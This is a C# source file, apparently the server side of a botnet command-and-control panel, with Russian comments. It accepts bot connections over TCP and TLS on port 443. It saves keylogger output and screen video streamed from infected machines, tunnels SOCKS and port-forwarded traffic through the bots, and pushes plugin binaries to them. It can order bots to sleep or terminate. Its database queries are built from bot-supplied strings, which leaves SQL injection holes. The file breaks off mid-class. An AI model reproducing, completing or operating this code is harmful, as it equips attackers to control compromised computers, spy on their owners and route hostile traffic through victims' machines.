using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Threading;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Data;
using System.Data.OleDb;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;

namespace Server
{
    public class ServerBot
    {
        int port;
        Socket sc;
        List<ClientBot> bots;
		public StreamFactory streamFactory { get; private set; }
        object lockBots;
        public delegate void AddBot(ClientBot bot);
        public delegate void DelBot(ClientBot bot);
        public event AddBot AddBotEvent;
        public event DelBot DelBotEvent;
        Log log;
		public DB MDB;

        public ServerBot(int port)
        {
            this.port = port;
            bots = new List<ClientBot>();
			streamFactory = new StreamFactory();
            lockBots = new object();
            log = new Log();
			// MDB = new DB("server.mdb");
            MDB = new DB("server.sqlite");
        }

        public void Start()
        {
			try
			{
				sc = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				IPEndPoint pnt = new IPEndPoint(IPAddress.Any, port);
				sc.Bind(pnt);
				sc.Listen(200);
			}
			catch (Exception e)
			{
				MessageBox.Show("Произошла ошибка. Сервер остановлен. Возможно запущен другой экземпляр сервера с портом " + port.ToString() + "\n" + e.ToString());
				Application.Exit();
			}
            try
            {
                while(true)
                {
                    Socket botSc = sc.Accept();
                    if (botSc.Connected)
                    {
                        //System.Diagnostics.Debug.WriteLine("bot connected");
                        ClientBot bot = new ClientBot(botSc, null, null, this);
                        lock (lockBots)
                        {
                            bots.Add(bot);
                        }
                        Thread thread = new Thread(bot.Record);
                        thread.Start();
#if !NOGUI
                        AddBotEvent(bot);
#endif
                    }
                }
            }
            catch
            {
            }
        }

		//создание сертификата
		//создает самозаверяющий сертификат, задает имя субъекта "CN=XYZ Company", задает начало и окончание срока действия, 
		//помещает ключ в хранилище my, задает ключ обмена и помечает закрытый ключ как экспортируемый.
		//makecert -r -pe -n "CN=XYZ Company" -b 01/01/2005 -e 01/01/2010 -sky exchange -ss my
		//ключ экспортируется через mmc.exe, там добавляется оснастка Сертификаты (через Файл->Добавить или удалить оснастку)
		//файл pfx сохранить под именем certificate.pfx с паролем 1
		public void StartHttps()
		{
			TcpListener listener = new TcpListener(IPAddress.Any, 443);
			X509Certificate certificate = new X509Certificate2("certificate.pfx", "1"); ;
			listener.Start();
			try
			{
				while (true)
				{
					TcpClient client = listener.AcceptTcpClient();
					try
					{
						//System.Diagnostics.Debug.WriteLine("1");
						SslStream ssl = new SslStream(client.GetStream());
						ssl.AuthenticateAsServer(certificate);
						ClientBot bot = new ClientBot(null, client, ssl, this);
						lock (lockBots)
						{
							bots.Add(bot);
						}
						Thread thread = new Thread(bot.Record);
						thread.Start();
					}
					catch (Exception e)
					{
						//System.Diagnostics.Debug.WriteLine(e.ToString());
					}
					client = null;
				}
			}
			catch (Exception e)
			{
				//System.Diagnostics.Debug.WriteLine(e.ToString());
			}

		}

        public void Close()
        {
            lock (lockBots)
            {
                foreach (ClientBot bot in bots)
                    bot.Stop(false);
                bots.Clear();
            }
        }

        public void Stop()
        {
            sc.Close();
        }

        public void DeleteBot(ClientBot bot)
        {
#if !NOGUI
            DelBotEvent(bot);
#endif
            lock (lockBots)
            {
                bots.Remove(bot);
            }
        }

        public ClientBot[] ArrayBots
        {
            get { return bots.ToArray(); }
        }

        public ClientBot GetClientBot(int id)
        {
            ClientBot ret = null;
            lock (lockBots)
            {
                ret = bots.Find(b => b.ID == id);
            }
            return ret;
        }

        //поиск бота по его IP
        public ClientBot GetClientBot(string ip)
        {
            ClientBot ret = null;
            lock (lockBots)
            {
                ret = bots.Find(b => b.IP == ip);
            }
            return ret;
        }

		public ClientBot GetClientBotForUid(string uid)
		{
			ClientBot ret = null;
			lock (lockBots)
			{
				ret = bots.Find(b => b.UID == uid);
			}
			return ret;
		}
		
		//поиск объекта бота по иду объекта
        public object GetClientBotObject(int id, ref ClientBot bot)
        {
            object ret = null;
            lock (lockBots)
            {
                bot = null;
                foreach (ClientBot b in bots)
                {
                    ret = b.GetObject(id);
                    if (ret != null)
                    {
                        bot = b;
                        break;
                    }
                }
            }
            return ret;
        }

        public object GetClientBotObject(int id)
        {
            ClientBot bot = null;
            return GetClientBotObject(id, ref bot);
        }

        public void PrintLog(string s)
        {
            log.print(s);
        }

		public CmdManager.IdUid[] CM_GetIds()
		{
			CmdManager.IdUid[] ret = null;
			lock (lockBots)
			{
				ret = new CmdManager.IdUid[bots.Count];
				int i = 0;
				foreach (ClientBot bot in bots)
				{
					ret[i] = new CmdManager.IdUid();
					ret[i].id = bot.ID;
					ret[i].uid = bot.UID;
					ret[i].info = bot.Info;
					ret[i].ip = bot.IP;
					ret[i].comment = bot.Comment;
					ret[i].ports = bot.PortForward;
					ret[i].idGroup = bot.IdGroup;
					i++;
				}
			}
			return ret;
		}
    }

    public class ClientBot
    {
        Sender sc;
        ServerBot server;
		List<StreamProxy> streams;
        int idBot;
        static int lastId = 0;
        string uid;
        DateTime dateStart;
		DateTime dateLast; //дата последней записи времени работы бота
        bool vnc = false;
        int wait = 0; //сколько осталось секунд до удаления бота после разрыва связи с ним
        bool connected = false;
        bool reg = false; //если true, то бот будет входить в режим ожидания для восстановления соединения
        LogBot logText = null;

        List<SocketTunnel> tunnels;
		List<OneToManyTunnel> tunnelsOne;
        static int lastPort = 10000;
        object lockTunnels;
		object lockTunnelsOne;
		object lockStreams;
		static object lockLastPort = new object();
		string info = string.Empty; //информация о боте, которая присылается самим ботом
		string comment = string.Empty; //комментарий к боту, вводится пользователем
		int idGroup;

        public ClientBot(Socket sc, TcpClient tcpSc, System.IO.Stream stream, ServerBot srv)
        {
            this.sc = new Sender(sc, tcpSc, stream);
            server = srv;
            dateStart = DateTime.Now;
			dateLast = dateStart;
            tunnels = new List<SocketTunnel>();
			tunnelsOne = new List<OneToManyTunnel>();
			idBot = Interlocked.Increment(ref lastId);
            lockTunnels = new object();
			lockTunnelsOne = new object();
			lockStreams = new object();
            connected = true;
			streams = new List<StreamProxy>();
        }

        public void Record()
        {
            byte[] data = new byte[8192];
            int stop = 0;
			int cmd = 0;
            try
            {
                while (stop == 0)
                {
                    if (connected)
                    {
						uint id;
						int size;
                        cmd = sc.ReadPacket(ref data, out size, out id);
                        //System.Diagnostics.Debug.WriteLine("packet id = " + id.ToString() + ", len = " + data.Length.ToString());
                        if (cmd == 0) //разрыв связи
                        {
                            connected = false;
                            if (reg) //зарегистрированные боты входят в режим восстановления связи
                            {
                                wait = 60; //ожидать реконнекта 60 с.
                                sc.Close(); //закрываем сокет
                                continue;
                            }
                            else 
                                break;
                        }
						//раз в минуту пишем в базу последнее время работы бота
						if (DateTime.Now.Subtract(dateLast).TotalSeconds > 60)
						{
							UpdateData();
							dateLast = DateTime.Now;
						}
                        switch (cmd)
                        {
							case Sender.ID_STREAM_CREATE:
								CreateStream(data, size, id, null);
								break;
							case Sender.ID_STREAM_RECREATE:
								RecreateStream(data, size, id);
								break;
							case Sender.ID_STREAM_DATA:
								WriteStream(id, data, size);
								break;
							case Sender.ID_STREAM_CLOSE:
								CloseStream(id, data, size);
								break;
                            case Sender.ID_VNC_CONNECT:
                                uid = Encoding.ASCII.GetString(data, 0, data.Length);
                                vnc = true;
                                break;
                            case Sender.ID_PORT_FORWARD:
                                stop = CmdOpenForward(data);
                                break;
							case Sender.ID_BC_PORT:
								stop = CmdBCPort(data, size);
								break;
                            case Sender.ID_START_PORTFORWARD:
                                CmdStartPortForward(data, id);
                                break;
                            case Sender.ID_GET_PORTFORWARD:
                                CmdGetPortForward(data, id);
                                break;
                            case Sender.ID_SET_UID:
							case Sender.ID_SET_UID2:
                                uid = Encoding.ASCII.GetString(data, 0, size);
								SelectData();
                                break;
                            case Sender.ID_PING: //ничего не делаем, бот просто оповещает что он жив
                                break;
                            case Sender.ID_INFO:
                                CmdInfo(data);
                                break;
                            case Sender.ID_REG:
                                if (RegBot(data, id))
                                    reg = true;
                                else
                                    stop = 1; //удаляем бота, а соединение не закрываем
                                break;
                            case Sender.ID_CLOSE:
                                stop = 2;
                                break;
                            case Sender.ID_LOG:
                                SaveTextToLog(data);
                                break;
							case Sender.ID_BOT_WORK:
								byte[] res = new byte[1];
								res[0] = 0;
								if (tunnels.Count > 0)
								{
									res[0] = 1;
								}
								sc.WritePacket(Sender.ID_BOT_WORK, id, res, 1);
								break;
							//пришли данные по протоколу socks, отправляем в нужный сокет
							case Sender.ID_SOCKS:
								SendDataToManyTunnel(cmd, data, size);
								break;
							case Sender.ID_PORTFORWARD:
								SendDataToManyTunnel(cmd, data, size);
								break;
							case Sender.ID_KEYLOGGER:
                                CmdKeyLogger(data);
                                break;
							case Sender.ID_SENDSTR:
								CmdSendStr(data);
								break;
							case Sender.ID_PLUGIN:
								CmdPlugin(data, id);
								break;
							case Sender.ID_XOR_MASK:
								sc.aesKey = new byte[size];
								Array.Copy(data, sc.aesKey, size);
								break;
                        }
                    }
                    else
                    {
                        wait--;
                        if (wait == 0)
                            stop = 2;
                        else
                            Thread.Sleep(1000);
                    }
                }
            }
            catch (Exception)
            {
                //Console.WriteLine(e.ToString());
                //System.Diagnostics.Debug.WriteLine("------ " + e.ToString() );
                if (sc != null && sc.Connected)
                    sc.Close();
                sc = null;
            }
//			System.Diagnostics.Debug.WriteLine("-- 5 " + cmd.ToString());
			//ставим на ожидание потоки
			foreach (StreamProxy stream in streams)
				stream.Waiting();
//            RecreateVideoFile(fsVideo, true); //закрываем видео файл
            if( stop == 1 ) 
                sc = null;
            else
                if (sc != null)
                {
                    sc.Close();
                    sc = null;
                }
			if (logText != null) logText.Close();
			lock (lockTunnelsOne)
			{
				foreach (OneToManyTunnel otmt in tunnelsOne)
					otmt.Stop();
			}
			CloseSocketTunnels();
            //sw.Close();
            Stop(true);
        }

        string GetFolder(string typeName, string folderName)
        {
			try
			{
				string path = System.IO.Path.Combine(System.Windows.Forms.Application.StartupPath, typeName);
				if (!System.IO.Directory.Exists(path)) System.IO.Directory.CreateDirectory(path);
				if (folderName.Length > 0)
				{
					foreach (char c in System.IO.Path.GetInvalidFileNameChars())
						folderName = folderName.Replace(c, '_');
					path = System.IO.Path.Combine(path, folderName);
					if (!System.IO.Directory.Exists(path)) System.IO.Directory.CreateDirectory(path);
				}
				path = System.IO.Path.Combine(path, uid);
				if (!System.IO.Directory.Exists(path)) System.IO.Directory.CreateDirectory(path);
				return path;
			}
			catch
			{
				return string.Empty;
			}
        }

		void CreateStream(byte[] data, int size, uint id, StreamProxy stream)
		{
			uint idStream = 0;
			switch (data[0])
			{
				case StreamType.File:
					idStream = CreateStreamFile(data, size, stream);
					break;
				case StreamType.Video:
					idStream = CreateStreamVideo(data, size, stream);
					break;
				case StreamType.Log:
					idStream = CreateStreamLog(data, size, stream);
					break;
				case StreamType.Pipe:
					idStream = CreateStreamPipe(data, size, stream);
					break;
			}
			if (idStream != 0 && stream == null)
			{
				DataConvert.PutUInt(idStream, data, 0);
				sc.WritePacket(Sender.ID_STREAM_CREATE, id, data, 4);
			}
		}

		void RecreateStream(byte[] data, int size, uint id)
		{
			uint oldId = BitConverter.ToUInt32(data, 0);
			uint newId = BitConverter.ToUInt32(data, 4);
			StreamProxy stream = GetStream(newId);
			if (stream == null) return;
			byte[] data2 = new byte[size - 8];
			Array.Copy(data, 8, data2, 0, size - 8);
			//после создания потока в steam должно быть два потока: запись в память и вновь созданный
			CreateStream(data2, size - 8, 0, stream);
			//нужно переписать все данные из потока в память (временный) в новый
			if (stream.Receivers.Count >= 2 && stream.Receivers[0].Type == StreamType.Memory)
			{
				StreamMemory sm = stream.Receivers[0] as StreamMemory;
				for (int i = 1; i < stream.Receivers.Count; i++)
					sm.Flush(stream.Receivers[i]);
				sm.Close();
				stream.DelReceiver(sm);
				//после получение команды на переоткрытие потока, все последующие данные будут под новым идом, поэтому временный поток со старым идом можно удалить
				lock(lockStreams)
					streams.RemoveAll(s => s.id == oldId);
			}
		}

		string MakeStreamFileName(string ext)
		{
			return DateTime.Now.ToString("yyyyMMddHHmmss") + idBot.ToString("000000") + "." + ext;
		}

		string MakeStreamFileName(string typeName, string folderName, string ext)
		{
			string path = GetFolder(typeName, folderName);
			if (path.Length > 0)
			{
				string fileName = MakeStreamFileName(ext);
				path = System.IO.Path.Combine(path, fileName);
			}
			return path;
		}

		uint CreateStreamFile(byte[] data, int size, StreamProxy stream)
		{
			int i = 1;
			string typeName = DataConvert.GetString(data, ref i);
			if (typeName.Length == 0) return 0;
			string fileName = DataConvert.GetString(data, ref i);
			if( fileName.Length == 0) return 0;
			string ext = DataConvert.GetString(data, ref i); //расширение может быть пустым
			string path = MakeStreamFileName(typeName, fileName, ext);
			if (path.Length == 0) return 0;
			if (stream == null)
			{
				stream = server.streamFactory.CreateStream(uid);
				AddStream(stream);
			}
			stream.AddReceiver(new StreamFile(path));
			return stream.id;
		}

		void AddStream(StreamProxy stream)
		{
			lock (lockStreams)
			{
				streams.Add(stream);
			}
		}

		public bool AddStreamReceiver(uint idStream, StreamReceiver stream)
		{
			StreamProxy proxy = GetStream(idStream);
			if (proxy != null)
			{
				lock (lockStreams)
				{
					StreamPipe pipe = proxy.Receivers[0] as StreamPipe;
					if (pipe != null && pipe.Update(stream)) //для pipe потока меняем запись в память на запись в указанный поток 
					{
					}
					else
					{
						proxy.AddReceiver(stream);
					}
					return true;
				}
			}
			return false;
		}

		uint CreateStreamVideo(byte[] data, int size, StreamProxy stream)
		{
			int i = 1;
			string fileName = DataConvert.GetString(data, ref i);
			if (fileName.Length == 0) return 0;
			string path = MakeStreamFileName("Video", fileName, "frm");
			if (path.Length == 0) return 0;
			try
			{
				if (stream == null)
				{
					stream = server.streamFactory.CreateStream(uid);
					AddStream(stream);
				}
				stream.AddReceiver(new StreamVideo(path, sc.RemoteEndPoint.Address.GetAddressBytes()));
				return stream.id;
			}
			catch
			{
				return 0;
			}
		}

		uint CreateStreamLog(byte[] data, int size, StreamProxy stream)
		{
			int i = 1;
			string fileName = DataConvert.GetString(data, ref i);
			if (fileName.Length == 0) return 0;
			string path = MakeStreamFileName("Logs", fileName, "txt");
			if (path.Length == 0) return 0;
			if (stream == null)
			{
				stream = server.streamFactory.CreateStream(uid);
				AddStream(stream);
			}
			stream.AddReceiver(new StreamLog(path));
			return stream.id;
		}

		uint CreateStreamPipe(byte[] data, int size, StreamProxy stream)
		{
			int i = 1;
			string idPipe = DataConvert.GetString(data, ref i);
			if (idPipe.Length == 0) return 0;
			string namePipe = DataConvert.GetString(data, ref i);
			if (namePipe.Length == 0) return 0;
			if (stream == null)
			{
				stream = server.streamFactory.CreateStream(uid);
				AddStream(stream);
			}
			stream.name = idPipe;
			StreamPipe pipe = new StreamPipe(namePipe);
			stream.AddReceiver(pipe);
			return stream.id;
		}

		StreamProxy GetStream(uint idStream)
		{
			StreamProxy stream = null;
			lock (lockStreams)
			{
				stream = streams.Find(s => s.id == idStream);
			}
			if (stream == null)
			{
				stream = server.streamFactory.GetStream(idStream);
				if (stream != null)
					if (stream.uid != uid) //данный поток не принадлежит данному боту, такое может быть, если сервер быле перезапущен
						stream = null;
				if (stream != null) //поток был, но был разрыв соединения, поэтому добавляем себе
					AddStream(stream);
				else //если бот шлет данные для потока, а такого потока на сервере нет, то скорее всего сервер был перезапущен, в этом случае
				{	//создаем поток для запоминания данных и боту сообщаем что нужно заново создать поток 
					stream = server.streamFactory.CreateStream(uid); //создаем новый поток с новым идом
					//если новый ид равен старому, то меняем новый ид
					while (stream.id == idStream)
						server.streamFactory.ChangeId(stream);
					StreamMemory sm = new StreamMemory();
					stream.AddReceiver(sm);
					StreamProxy stream2 = new StreamProxy(idStream, uid); //создаем поток для временного приема данных по старому иду
					StreamRedirect sr = new StreamRedirect(stream); //данные будут перенаправлены новому потоку
					stream2.AddReceiver(sr);
					lock (lockStreams)
					{
						streams.Add(stream);
						streams.Add(stream2);
						byte[] data = new byte[8];
						Array.Copy( BitConverter.GetBytes(idStream), data, 4); //старый ид
						Array.Copy( BitConverter.GetBytes(stream.id), 0, data, 4, 4); //новый ид
						sc.WritePacket(Sender.ID_STREAM_RECREATE, 0, data, data.Length);
					}
				}
			}
			return stream;
		}

		void WriteStream(uint idStream, byte[] data, int size)
		{
			StreamProxy stream = GetStream(idStream);
			lock (lockStreams)
			{
				if (stream != null)
				{
					stream.Write(data, 0, size);
				}
			}
		}

		void CloseStream(uint idStream, byte[] data, int size)
		{
			StreamProxy stream = GetStream(idStream);
			if (stream != null)
			{
				lock (lockStreams)
				{
					streams.Remove(stream);
				}
				server.streamFactory.CloseStream(idStream);
			}
		}

        public void Stop(bool del)
        {
            if( sc != null ) sc.Close();
            lock (lockTunnels)
            {
                foreach (SocketTunnel st in tunnels)
                    st.Close();
            }
            if (del)
                server.DeleteBot(this);
            sc = null;
        }

		void SendDataToManyTunnel(int cmd, byte[] data, int size)
		{
			foreach (OneToManyTunnel otmt in tunnelsOne)
				if( otmt.Cmd == cmd )
				{
					if (otmt.SendData(cmd, data, size))
						break;
				}
		}

        public bool IsWork
        {
            get
            {
                return sc == null ? false : true;
            }
        }

		void CmdInfo(byte[] data)
        {
            if (data[0] == 1)
            {
                server.PrintLog("Бот uid=" + uid + " закончил отправку папки"); 
            }
        }

        void CmdStartPortForward(byte[] data, uint id)
        {
            int port = BitConverter.ToInt16(data, 0);
            string ip = Sender.GetCString(data, 2);
            int idPort = 0;
            ClientBot bot = server.GetClientBot(ip);
            if( bot != null)
                idPort = bot.OpenPortForward(port);
            sc.WritePacket(Sender.ID_START_PORTFORWARD, id, BitConverter.GetBytes(idPort), 4); //отсылаем ид порта, который нужно обязательно потом возвращать
        }

        void CmdGetPortForward(byte[] data, uint id)
        {
            int port = 0;
            if (data.Length >= 4)
            {
                int idPort = BitConverter.ToInt32(data, 0);
                object tunnel = server.GetClientBotObject(idPort);
                if (tunnel != null && tunnel is SocketTunnel)
                    port = ((SocketTunnel)tunnel).Port;
            }
            sc.WritePacket(Sender.ID_GET_PORTFORWARD, id, BitConverter.GetBytes(port), 2); //для порта достаточно 2-х байт
        }

        int CmdOpenForward(byte[] data)
        {
            if (data.Length >= 6)
            {
                int idForward = BitConverter.ToInt32(data, 0); //ид бота который заказал проброс
                int portForw = BitConverter.ToInt16(data, 4);
                int idPort = 0;
                if( data.Length >= 10 )
                    idPort = BitConverter.ToInt32(data, 6);
                ClientBot bot = server.GetClientBot(idForward);
                if (bot != null)
                {
                    if (bot.CreateTunnel(sc, portForw, idPort))
                        return 1; //закрываем этого бота, но само соединение нет
                }
            }
            return 2; //соединение которое подало команду проброса, куда-то пропало
        }

		int CmdBCPort(byte[] data, int size)
		{
			string uid = Encoding.ASCII.GetString(data, 0, size);
			ClientBot bot = server.GetClientBotForUid(uid);
			if (bot != null)
			{
				if (bot.CreateTunnel(sc, 0, 0))
					return 1;
			}
			return 2;
		}

        void CmdKeyLogger(byte[] data)
        {
            string path = GetFolder("Logs", string.Empty);
            DateTime dateBeg = DateTime.Now;
            string nameFile = path + '\\' + dateBeg.ToString("yyyyMMddHHmmss") + idBot.ToString("000000") + ".txt";
            System.IO.File.WriteAllBytes(nameFile, data);
        }

		void CmdSendStr(byte[] data)
		{
			int id = BitConverter.ToInt32(data, 0);
			int subId = BitConverter.ToInt32(data, 4);
			int len = BitConverter.ToInt32(data, 8);
			string s = Encoding.GetEncoding(1251).GetString(data, 12, len);
			switch (id)
			{
				case 1: //информация о боте
					info = s;
					UpdateData();
					break;
			}
		}

		void CmdPlugin(byte[] data, uint id)
		{
			int i = 0;
			string namePlugin = DataConvert.GetString(data, ref i);
			string pathPlugin = System.IO.Path.Combine(System.Windows.Forms.Application.StartupPath, "_plugins");
			pathPlugin = System.IO.Path.Combine(pathPlugin, namePlugin);
			if (System.IO.File.Exists(pathPlugin))
			{
				byte[] body = System.IO.File.ReadAllBytes(pathPlugin);
				byte[] sz = BitConverter.GetBytes(body.Length);
				byte[] body2 = new byte[body.Length + sz.Length];
				Array.Copy( sz, body2, sz.Length);
				Array.Copy(body, 0, body2, sz.Length, body.Length);
				sc.WritePacket(Sender.ID_PLUGIN, id, body2, body2.Length);
			}
			else
			{
				byte[] sz = new byte[4];
				Array.Clear(sz, 0, 4);
				sc.WritePacket(Sender.ID_PLUGIN, id, sz, sz.Length);
			}
		}

        //посылаем команду VNC боту на проброс порта (будет снова соединяться с сервером)
        public int OpenPortForward(int port)
        {
            return 0;
        }

		public int OpenPortForward(int cmd, int port)
		{
			byte[] bid = BitConverter.GetBytes(idBot); //посылаем id бота, чтобы сервер потом знал куда цеплять туннель
			byte[] bport = BitConverter.GetBytes(port);
			lastId++;
			int idPort = lastId;
			byte[] bidPort = BitConverter.GetBytes(idPort); //отсылаем ид порта, который потом должен прийти от бота, необходим чтобы потом можно было найти нужный туннель
			byte[] data = new byte[10];
			Array.Copy(bid, data, 4);
			Array.Copy(bport, 0, data, 4, 2); //отсылаем только два младших байта (номер порта не может быть больше 65535)
			Array.Copy(bidPort, 0, data, 6, 4);
			if (sc.WritePacket(cmd, 0, data, 10))
				return idPort;
			return 0;
		}

		public void SendCmdString(int cmd, string s)
		{
			int c_data = s.Length + 2;
			byte[] data = new byte[c_data];
			//шлем длину строки (2 байта)
			data[0] = (byte)(s.Length & 0xff);
			data[1] = (byte)(s.Length / 256);
			Encoding.GetEncoding(1251).GetBytes(s, 0, s.Length, data, 2);
			sc.WritePacket(cmd, 0, data, c_data);
		}

        public void ClosePortForward()
        {
            if (tunnels != null)
            {
                lock (lockTunnels)
                {
                    foreach (SocketTunnel st in tunnels)
                        st.Close();
                }
            }
        }

		public void CloseTunnelsOne()
		{
			if (tunnelsOne != null)
			{
				lock (lockTunnelsOne)
				{
					byte[] buf = new byte[1] { 0 };
					int cmd = 0;
					foreach (OneToManyTunnel otmt in tunnelsOne)
					{
						otmt.Stop();
						switch (otmt.Cmd)
						{
							case Sender.ID_SOCKS:		cmd = Sender.ID_SOCKS_ON_OFF;		break;
							case Sender.ID_PORTFORWARD:	cmd = Sender.ID_PORTFORWARD_ON_OFF;	break;
						}
						sc.WritePacket(cmd, 0, buf, 1);
					}
				}
			}
		}

		public void CloseSocketTunnels()
		{
			if (tunnels != null)
			{
				lock (tunnels)
				{
					foreach (SocketTunnel st in tunnels)
					{
						st.Close();
					}
				}
			}
		}

        //дает команду боту чтобы он отключился от сервера (завершил свою работу)
        public void OffBot(int param, int time)
        {
			if (param == 3)
			{
				byte[] data = BitConverter.GetBytes(time);
				sc.WritePacket(Sender.ID_SLEEP, 0, data, 4);
			}
			else
			{
				byte[] data = BitConverter.GetBytes(param); //параметр команды ID_EXIT - 1 - перейти в режим спячки, 2 - отключение от сервера, 10 - завершить процесс
				sc.WritePacket(Sender.ID_EXIT, 0, data, 4);
				sc.WritePacket(Sender.ID_CLOSE, 0, data, 4);
			}
        }

        //регистрирует бота, используется для возможности восстановления связи
        //возвращает true если бота нужно оставить, иначе закрыть и удалить
        bool RegBot(byte[] data, uint idPacket)
        {
            int id = BitConverter.ToInt32(data, 0); //если 0, то регистрация нового бота, если >0, то бот пытается восстановить соединение
            uid = Sender.GetCString(data, 4);
            bool ret = true;
            ClientBot bot = null;
            if (id > 0) //попытка восстановить соединение
            {
                bot = server.GetClientBot(id); //ищем бота
                if (bot != null && bot.wait > 1) //бот с переданным идом есть и он в режиме ожидания, значит восстанавливаем соединение
                {
                    ret = false;
                    bot.wait = 1000; //говорим чтобы бот подольше ждал пока передадим ему соединение, иначе может закрыться раньше времени
                }
                else
                    id = idBot;
            }
            else
                id = idBot;
            byte[] output = BitConverter.GetBytes(id);
            sc.WritePacket(Sender.ID_REG, idPacket, output, 4); //отсылаем ид бота
            if (!ret) //восстанавливаем соединение
            {
                bot.sc.SetSocket(sc);
                sc = null;
                bot.connected = true; //в другом потоке бот продолжит работу, а текущий удалится
            }
            return ret;
        }

        //запись строки лога
        void SaveTextToLog(byte[] data)
        {
            try
            {
                int i = 0;
                //время на стороне бота
                DateTime dt = DataConvert.GetDateTime(data, i); i += 7;
                //длина имени лога
				int szNameLog = DataConvert.GetShort(data, i); i += 2;
                //имя лога
                string nameLog = Encoding.GetEncoding(1251).GetString(data, i, szNameLog); i += szNameLog;
                //код текста лога
				int codeLog = DataConvert.GetShort(data, i); i += 2;
                //длина текста лога
				int szText = DataConvert.GetShort(data, i); i += 2;
                //текст лога
                string text = Encoding.GetEncoding(1251).GetString(data, i, szText); i += szText;
                if (logText == null)
                    logText = new LogBot(GetFolder("Logs", string.Empty)); //папка логов
                logText.Print(nameLog, dt, codeLog, text);
            }
            catch
            {
            }
        }

        //возвращает объект принадлежащий боту
        public object GetObject(int id)
        {
            if (idBot == id) return this;
            lock (lockTunnels)
            {
                return tunnels.Find(t => t.IdPort == id);
            }
        }

        public bool CreateTunnel(Sender sc1, int portForw, int idPort)
        {
            bool ret = false;
            //смотрим, может уже есть такой туннель
            //object o = GetObject(idBot);
            try
            {
                Socket scListen = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                while (true)
                {
					int port = GetLastPort();
                    IPEndPoint pnt = new IPEndPoint(IPAddress.Any, port);
                    bool err = false;
                    try
                    {
                        scListen.Bind(pnt);
                    }
                    catch
                    {
                        err = true;
                    }
                    if (!err)
                    {
                        scListen.Listen(200);
                        SocketTunnel st = new SocketTunnel(port, portForw, idPort, this, sc1, scListen);
                        lock (lockTunnels)
                        {
                            tunnels.Add(st);
                        }
                        Thread th = new Thread(st.Run);
                        th.Start();
                        ret = true;
                        break;
                    }
                }
            }
            catch
            {
            }
            return ret;
        }

		public void CreateTunnelOne(int cmd, string name, int cmdOnOff, byte[] createData)
		{
			if (!ExistsTunnelOne(cmd, name))
			{
				OneToManyTunnel otmt = new OneToManyTunnel(this, GetLastPort(), cmd, name, createData);
				lock (lockTunnelsOne)
				{
					tunnelsOne.Add(otmt);
				}
				byte[] buf = new byte[1] { 1 };
				sc.WritePacket(cmdOnOff, 0, buf, 1);
				Thread th = new Thread(otmt.Run);
				th.Start();
			}
		}

		public void CreateService(int id, byte[] idData, string name, byte[] data)
		{
			byte[] buf = null;
			if (idData == null)
				buf = new byte[1] { 1 };
			else
				buf = idData;
			sc.WritePacket(id, 0, buf, buf.Length);
			if( data != null )
				CreateTunnelOne(Sender.ID_PORTFORWARD, name, Sender.ID_PORTFORWARD_ON_OFF, data);
		} 

		bool ExistsTunnelOne(int cmd, string name)
		{
			bool ret = false;
			lock (lockTunnelsOne)
			{
				ret = tunnelsOne.Exists(o => o.Cmd == cmd && o.Name == name);
			}
			return ret;
		}

        public void DelTunnel(SocketTunnel st)
        {
            lock (lockTunnels)
            {
                tunnels.Remove(st);
            }
        }

		public void DelTunnelOne(OneToManyTunnel otmt)
		{
			lock (lockTunnelsOne)
			{
				tunnelsOne.Remove(otmt);
			}
		}

		//обновление данных по боту в базе
		public void UpdateData()
		{
			DB db = server.MDB.Clone();
			int id = db.GetInt("SELECT [Id] FROM [bots] WHERE [UID]='" + uid + "'");
			string sql = string.Empty;
			if (id == 0)
			{
				sql = "INSERT INTO [bots] ([UID],[IP],[FirstDate],[LastDate],[Info],[Comment],[IdGroup]) VALUES('" + uid + "','" + IP + "','" +
					DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "','" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "','" + info + "','" + comment + "'," + idGroup.ToString() + ")";
			}
			else
			{
				sql = "UPDATE [bots] SET [IP]='" + IP + "', [LastDate]='" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "',[Info]='" + info + "',[Comment]='" + comment +"',[IdGroup]=" + idGroup.ToString() + " WHERE [Id]=" + id.ToString();
			}
			try
			{
				db.SendSQL(sql);
			}
			catch (Exception e)
			{
				System.Diagnostics.Debug.WriteLine(e.ToString());
			}
		}

		//выборка данных о боте из базы данных
		public void SelectData()
		{
			DB db = server.MDB.Clone();
			string sql = "SELECT [Info],[Comment],[IdGroup] FROM [bots] WHERE [UID]='" + uid + "'";
			try
			{
				DataTable tbl = db.GetTable(sql);
				if (tbl.Rows.Count > 0)
				{
					DataRow row = tbl.Rows[0];
					info = DB.Nz.GetString(row["Info"]);
					comment = DB.Nz.GetString(row["Comment"]);
					idGroup = DB.Nz.GetInt(row["IdGroup"]);
				}
			}
			catch (Exception)
			{
			}
		}

		static public int GetLastPort()
		{
			int ret = 0;
			lock (lockLastPort)
			{
				ret = lastPort;
				lastPort++;
			}
			return ret;
		}

        public string PortForward
        {
            get
            {
                string ret = string.Empty;
                lock (lockTunnels)
                {
                    foreach (SocketTunnel st in tunnels)
                    {
                        if (ret.Length > 0) ret += ", ";
                        ret += st.Port.ToString() + " (" + st.PortForw.ToString() + ")";
                    }
                }
				lock (lockTunnelsOne)
				{
					foreach (OneToManyTunnel otmt in tunnelsOne)
					{
						if (ret.Length > 0) ret += ", ";
						ret += otmt.Port.ToString() + " (" + otmt.Name + ")";
					}
				}
                return ret;
            }
        }

        public int ID
        {
            get { return idBot; }
        }

        public string IP
        {
            get
            {
                try
                {
                    return sc.RemoteEndPoint.Address.ToString();
                }
                catch
                {
                }
                return string.Empty;
            } 
        }

        public string UID
        {
            get { return uid; }
        }

        public DateTime DateStart
        {
            get { return dateStart; }
        }

        public int RecvBytes
        {
            get { return sc.RecvBytes; }
        }

        public int SendBytes
        {
            get { return sc.SendBytes; }
        }

        public int RecvKBytes
        {
            get { return sc == null ? 0 : sc.RecvBytes / 1024; }
        }

        public int SendKBytes
        {
            get { return sc == null ? 0 : sc.SendBytes / 1024; }
        }

        public bool VNC
        {
            get { return vnc; }
        }

        public bool IsReg
        {
            get { return reg; }
        }

		public Sender SC
		{
			get { return sc; }
		}

		public string Info
		{
			get { return info; }
		}

		public string Comment
		{
			get { return comment; }
			set
			{
				comment = value;
